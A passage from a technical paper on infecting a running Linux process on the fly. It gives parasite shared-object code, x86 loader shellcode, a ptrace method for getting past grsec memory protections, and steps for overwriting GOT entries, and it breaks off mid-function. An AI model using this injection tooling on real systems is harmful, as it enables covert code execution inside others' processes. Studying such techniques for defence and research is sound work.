&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :<span style="color: #ff0000;">"0"</span> <span style="color: black;">(</span>SYS_write<span style="color: black;">)</span>, <span style="color: #ff0000;">"S"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> fd<span style="color: black;">)</span>,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"c"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> buf<span style="color: black;">)</span>, <span style="color: #ff0000;">"d"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> count<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ret &gt;= <span style="color: #cc66cc;">0</span><span style="color: black;">)</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">int</span><span style="color: black;">)</span> ret;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Also, your parasite make file should look something like this:</p>
<pre class="source">gcc -fPIC -c libtest.c -nostdlib
ld -shared -soname libtest.so.1 -o libtest.so.1.0 libtest.o
</pre>
<p>2. The end of our replacement function needs to somehow return flow of execution back to the original function with the stack pointer in place etc. My parasite framework ends with a function epilogue, and an indirect jmp back to the original function; this is one way a parasite function can end:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> __asm__ __volatile__<br>
&nbsp; &nbsp; <span style="color: black;">(</span><span style="color: #ff0000;">"movl %ebp, %esp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"pop %ebp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"movl $0x00000000, %eax<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"jmp *%eax"</span><span style="color: black;">)</span>;<br>
&nbsp;</div>
<p>Keep it volatile so it stays in place for when we go to patch it.</p>
<p><strong>The test parasite</strong></p>
<p>Our target program, if you recall, simply prints the word 'test!' every 5 seconds; as a result we will be hijacking the libc puts() function. Our replacement function should have the same parameters as the original function.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/*********************** SHARED OBJECT PARASITE **********************/</span><br>
<br>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/syscall.h&gt;</span><br>
<br>
<span style="color: #993333;">int</span> evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>;<br>
<br>
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span><br>
_write <span style="color: black;">(</span><span style="color: #993333;">int</span> fd, <span style="color: #993333;">void</span> *buf, <span style="color: #993333;">int</span> count<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; <span style="color: #993333;">long</span> ret;<br>
<br>
&nbsp; __asm__ __volatile__ <span style="color: black;">(</span><span style="color: #ff0000;">"pushl %%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"movl %%esi,%%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"int $0x80<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span> <span style="color: #ff0000;">"popl %%ebx"</span>:<span style="color: #ff0000;">"=a"</span> <span style="color: black;">(</span>ret<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :<span style="color: #ff0000;">"0"</span> <span style="color: black;">(</span>SYS_write<span style="color: black;">)</span>, <span style="color: #ff0000;">"S"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> fd<span style="color: black;">)</span>,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"c"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> buf<span style="color: black;">)</span>, <span style="color: #ff0000;">"d"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> count<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ret &gt;= <span style="color: #cc66cc;">0</span><span style="color: black;">)</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">int</span><span style="color: black;">)</span> ret;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* we must allocate our strings this way on the stack to be PIC */</span><br>
<span style="color: #808080; font-style: italic;">/* otherwise they get stored into .rodata and we can't use them */</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* we are prepending the word 'evil' to whatever string is on the stack */</span><br>
<br>
&nbsp; _write <span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, new_string, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>;<br>
&nbsp; _write <span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, buf, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; <span style="color: #993333;">char</span> newline<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;newline<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span>;<br>
<br>
&nbsp; _write <span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, newline, <span style="color: #cc66cc;">1</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* perform the function epilogue, and setup the jump which our */</span><br>
<span style="color: #808080; font-style: italic;">/* hijacker will patch with the right address */</span><br>
<br>
&nbsp; __asm__ __volatile__<br>
&nbsp; &nbsp; <span style="color: black;">(</span><span style="color: #ff0000;">"movl %ebp, %esp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"pop %ebp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"movl $0x00000000, %eax<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"jmp *%eax"</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: black;">}</span><br>
<br>
<br>
<span style="color: #993333;">void</span><br>
_init <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
<span style="color: #993333;">void</span><br>
_fini <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>There is definitely room for innovation with the parasite, and modifying the arguments is possible by modifying the stack, in which its easiest to use a function pointer instead of the jmp. If we wanted our parasite to simply modify the string on the stack that puts() takes as an argument, our parasite function would look like this instead:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* parasite that modifies args */</span><br>
<br>
<span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;<br>
&nbsp; <span style="color: #b1b100;">return</span> origfunc<span style="color: black;">(</span>new_string<span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>And our hijacker would need to patch the function pointer with the address of the original puts() function. This works like a charm.</p>
<h2><a name="c4"></a>4 - Loading the parasite</h2>
<p>Obviously a process will not execute a library function if the library is not loaded into the process address space. Perhaps the trickiest part of writing this hijacker was designing the best way to get the evil shared object loaded; By the end of writing this paper I had two reliable methods of forcing the target process to load your shared object, one of which can bypass grsec memory protection for ELF segment binary flags.</p>
<p>My initial method was purely proof of concept so that I could simply employ my hijacking algorithm without my hijacker having to actually do the library loading -- this was to use LD_PRELOAD. This would be stupid and pointless since you have to restart the process you want to infect after setting the variable so that it loads your lib. That would be no good at all, because we want to infect a process ON-THE-FLY.</p>
<p>As mentioned earlier, __libc_dlopen_mode is available in libc and can load shared objects, but I did not study it enough to get it working... it may need to be initialized first.</p>
<p>The general method I came up with was to simply mmap the library one time as rwx for data and text, this method does not handle relocations, but is fine if we use a parasite that stays away from dynamic linking.</p>
<h3><a name="c41"></a>4.1 Loading the library the normal way</h3>
<div class="asm" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">_start:<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">jmp</span> B<br>
A:<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # fd = open<span style="color: black;">(</span><span style="color: #7f007f;">"libtest.so.1.0"</span>, O_RDONLY<span style="color: black;">)</span><span style="color: black; font-style: italic;">;</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %<span style="color: #46aa03; font-weight:bold;">ecx</span>, %<span style="color: #46aa03; font-weight:bold;">ecx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movb $<span style="color: #ff0000;">5</span>, %<span style="color: #46aa03; font-weight:bold;">al</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; popl %<span style="color: #46aa03; font-weight:bold;">ebx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %<span style="color: #46aa03; font-weight:bold;">ecx</span>, %<span style="color: #46aa03; font-weight:bold;">ecx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">int</span> $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; subl $<span style="color: #ff0000;">24</span>, %<span style="color: #46aa03; font-weight:bold;">esp</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; # mmap<span style="color: black;">(</span><span style="color: #ff0000;">0</span>, <span style="color: #ff0000;">8192</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, <span style="color: #ff0000;">0</span><span style="color: black;">)</span><span style="color: black; font-style: italic;">;</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %<span style="color: #46aa03; font-weight:bold;">edx</span>, %<span style="color: #46aa03; font-weight:bold;">edx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">edx</span>, <span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">8192</span>,<span style="color: #ff0000;">4</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">7</span>, <span style="color: #ff0000;">8</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">2</span>, <span style="color: #ff0000;">12</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">eax</span>,<span style="color: #ff0000;">16</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">edx</span>, <span style="color: #ff0000;">20</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">90</span>, %<span style="color: #46aa03; font-weight:bold;">eax</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">esp</span>, %<span style="color: #46aa03; font-weight:bold;">ebx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">int</span> $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # We need <span style="color: #0000ff;">this</span> to transfer control back to our hijacker once<br>
&nbsp; &nbsp; &nbsp; &nbsp; # our shellcode is done executing<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; int3<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # To get the address of the string dynamically we use <span style="color: #00007f;">call</span>/<span style="color: #00007f;">pop</span> method<br>
B:<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">call</span> A<br>
&nbsp; &nbsp; &nbsp; &nbsp; .string <span style="color: #7f007f;">"libtest.so.1.0"</span><br>
&nbsp;</div>
<p>This is simple code that mmap's the evil shared object (which is about 5k) into the process address space, we mmap with rwx; usually libc is mmap'd into a process several times, once for the text segment (with execute) and once for the data segment (with read). In our case we mmap the lib only once with rwx (<em>unless we are messing with GRSEC</em>) -- but how do we get the process to execute this code? The answer is that we must use ptrace to inject the code into the running process, then modify the instruction pointer to execute it.</p>
<h3><a name="c42"></a>4.2 Loading the library the Grsec way</h3>
<p>I'd like to give credit to andrewg for conceiving of this idea, which I implemented for the first time (that I've seen).</p>
<p>The grsec kernel patch for Linux has many features, and several of them apply to this paper, the primary one being that the text segment is marked read/execute only and therefore will not be writeable to inject shellcode with ptrace. This is a problem that we overcome using the following algorithm.</p>
<ol>
	<li>Use PTRACE_SYSCALL to locate sysenter
	<p>sysenter is used in modern Linux kernels instead of interrupt 0x80 because it is much faster. This can be found in the linux-gate marked as vdso within the map file of a process. In grsec all of the base addresses of memory maps are blank, and there fore getting the address from that file is useless. Here is what we are looking for:</p>
<pre class="source">fffe420 &lt;__kernel_vsyscall&gt;:
ffffe420:       51                      push   %ecx
ffffe421:       52                      push   %edx
ffffe422:       55                      push   %ebp
ffffe423:       89 e5                   mov    %esp,%ebp
ffffe425:       0f 34                   sysenter
</pre>
	<p>Our goal is to locate the next syscall in the running process, and get the eip value. The eip value is most likely going to be several bytes past sysenter, so maybe ffffe430.</p></li>
	<li>Save the registers right before the syscall is called with sysenter.</li>
	<li>Modify %eax with the syscall number of the syscall we want, in our case it is SYS_open.</li>
	<li>Modify the args to suite your syscall, and store necessary args into the data segment (not the stack). In our case we save the first N bytes of the data segment, then write our string "/lib/libtest.so.1.0".</li>
	<li>Locate sysenter by reading (reg.eip - 20) into a buffer with ptrace, then search through the buffer for the instructions \x0f\x34, so sysenter = (reg.eip - 20) + index.</li>
	<li>Modify %eip to point at sysenter, and use PTRACE_SINGLESTEP to execute the instructions up until sysenter. Repeat steps 3 - 6, but use mmap(), then proceed to 7.</li>
	<li>Restore data segment</li>
</ol>
<p>The algorithm above is employed in the code provided later on.</p>
<p>It is also worth noting that we could modify the .text memory layout using mmap() with MAP_FIXED, and then inject code into the text segment, but this modification would be overly apparent in /proc/pid/maps.</p>
<h2><a name="c5"></a>5 - ptrace primer</h2>
<p>Ptrace is an awesome syscall and is used by debuggers like gdb and tools like strace to follow and even modify the execution of a program. We will be using ptrace for both reading and modifying the process image as well as changing the flow of execution for a limited period of time. It is important to understand ELF if you want to effectively use ptrace -- </p>
<blockquote>
	<p>SYNOPSIS</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#include &lt;sys/ptrace.h&gt;</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">long</span> ptrace<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">enum</span> __ptrace_request request, pid_t pid,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">void</span> *addr, <span style="color: #993333;">void</span> *data<span style="color: black;">)</span>;<br>
&nbsp;</div>
</blockquote>
<p>We will be using several specific ptrace requests, and because this is not a ptrace tutorial I will give a brief overview of them.</p>
<p>PTRACE_ATTACH - This will attach the calling process to the process you want to trace-- thus making the calling process the parent. A SIGSTOP is sent to the traced process, so ptrace requests of this type should follow with a wait() or waitpid(). We can refer to processes that make this request as the 'tracing process'.</p>
<p>PTRACE_PEEKTEXT - This request allows the tracing process to read from a virtual memory address within the traced process image -- for instance, we could read the entire text segment into a buffer for analyzing, or check values in the data segment.</p>
<p>PTRACE_POKTEXT - This request allows the tracing process to modify any location within the traced process image, including privately mapped shared libraries!</p>
<p>PTRACE_GETREGS - This request allows the tracing process to get a copy of the traced processes registers i.e eax,ebx,ecx,edx,edi,esi,esp,eip etc.</p>
<p>PTRACE_SETREGS - This request allows the tracing process to set new register values for the traced process i.e modify the value of the instruction pointer.</p>
<p>PTRACE_CONT - This request says to that the stopped traced process may resume.</p>
<p>PTRACE_DETACH - This request resumes the child process as well, but detaches.</p>
<p>PTRACE SYSCALL - This request restarts the process, but arranges for it to stop at the entrance/exit of the next syscall. This allows us to inspect the arguments for the syscall, and even modify them.</p>
<p>PTRACE SINGLESTEP - This starts the process, but stops it after the next instruction.</p>
<p>The best way to begin demonstrating ptrace and the ideas so far presented is to outline our algorithm for the hijacker and begin to implement code for it.</p>
<h2><a name="c6"></a>6 - Hijacker algorithm</h2>
<ol>
	<li>Locate binary of target process by parsing /proc/&lt;pid&gt;/maps</li>
	<li>Parse PLT to get the desired GOT address</li>
	<li>Attach to the process</li>
	<li>Find a place to inject our evil .so loader shellcode</li>
</ol>
<p>STEPS 5 - 8 are different for GRSEC patched kernels</p>
<p>NON-GRSEC Method</p>
<ol start="5">
	<li>Inject new code, and save original code we are overwriting</li>
	<li>Get registers from process, and modify eip (save old eip) to point to our code</li>
	<li>Resume traced process so that it executes .so loader shellcode and loads our lib</li>
	<li>Reset registers, replace original code, and allow process to resume</li>
</ol>
<p>GRSEC Method</p>
<ol start="5">
	<li>Locate sysenter</li>
	<li>Save register state</li>
	<li>Modify registers and args to call open/mmap</li>
	<li>Execute sysenter with our modified args</li>
</ol>
<br>
<ol start="9">
	<li>Get base address of our evil library from %eax</li>
	<li>Find address of evil function within shared lib by scanning for its code sequence</li>
	<li>Retrieve and save value stored in desired GOT address (original function address)</li>
	<li>Patch the evil functions transfer-code, with original function address (so it can jmp/call to original)</li>
	<li>Overwrite desired GOT address with new value (evil function address)</li>
	<li>Detach from process and enjoy</li>
</ol>
<p>Lets go over it more closely...</p>
<h4>Step 1</h4>
<p>So our first step should be to locate the binary that spawned the target process; a look into the processes map file looks something like this:</p>
<pre class="source">-- /proc/&lt;pid&gt;/map --

08048000-08049000 r-xp 00000000 08:01 5654053    /home/elf/got_hijack/test
08049000-0804a000 rw-p 00000000 08:01 5654053    /home/elf/got_hijack/test
b7e19000-b7e1a000 rw-p b7e19000 00:00 0 
b7e1a000-b7f55000 r-xp 00000000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
b7f55000-b7f56000 r--p 0013b000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
b7f56000-b7f58000 rw-p 0013c000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
b7f58000-b7f5b000 rw-p b7f58000 00:00 0 
b7f65000-b7f68000 rw-p b7f65000 00:00 0 
b7f68000-b7f81000 r-xp 00000000 08:01 9093141    /lib/ld-2.5.so
b7f81000-b7f83000 rw-p 00019000 08:01 9093141    /lib/ld-2.5.so
bff6d000-bff82000 rw-p bffeb000 00:00 0          [stack]
ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
</pre>
<p>This file shows us information about the process image, including the executable that spawned the process, and the shared libraries that are mapped into the process address space. We also see the base address on the first line (which is 8048000), might as well grab it while were in the file, although we could also get it from the text phdr-&gt;p_vaddr just as easily. For ET_DYN files this is a little different, we get the base address and then depending on where it gets mmap'd into memory calculate the offset to get the real base. The code for parsing this file is very simple and not worth showing until the full hijacker is documented itself later on in the paper, however it is important to note that grsec patched kernels will not show the base addresses in the map file and therefore it is imperative to get these elsewhere i.e phdr-&gt;p_vaddr.</p>
<h4>Step 2</h4>
<p>Moving onto the second step, this is where we specify the function that we want to hijack, then pull its relocation entry so that we can get its corresponding GOT address/offset which will hold the address of the function we want to hijack. Parsing the executable to get this information is sufficient, which is why we must locate it in the previous step (although parsing the process image alone will work too). The function I wrote to do this will basically pull the information that 'readelf -r' pulls from an ELF binary.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* my custom struct linking_info looks like:<br>
struct linking_info<br>
{<br>
&nbsp; &nbsp; &nbsp; &nbsp; char name[256]; /* symbol name */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> index;&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* symbol number */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> count; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* total # of symbols */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t offset; <span style="color: #808080; font-style: italic;">/* addr/offset into the GOT */</span><br>
<span style="color: black;">}</span>;<br>
*/<br>
<br>
<span style="color: #808080; font-style: italic;">/* unsigned char *mem is a pointer to an mmap of the ELF file */</span><br>
<span style="color: #993333;">struct</span> linking_info * get_plt<span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr *shdr, *shdrp, *symshdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym *syms, *symsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Rel *rel;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> *symbol;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j, symcount, k;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> linking_info *link;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdr = <span style="color: black;">(</span>Elf32_Shdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_shoff<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdrp = shdr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdrp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>shdrp-&gt;sh_type == SHT_DYNSYM<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symshdr = &amp;shdr<span style="color: black;">[</span>shdrp-&gt;sh_link<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>symbol = malloc<span style="color: black;">(</span>symshdr-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>symbol, <span style="color: black;">(</span>mem + symshdr-&gt;sh_offset<span style="color: black;">)</span>, symshdr-&gt;sh_size<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>syms = <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>malloc<span style="color: black;">(</span>shdrp-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span><span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>syms, <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdrp-&gt;sh_offset<span style="color: black;">)</span>, shdrp-&gt;sh_size<span style="color: black;">)</span>;<br>
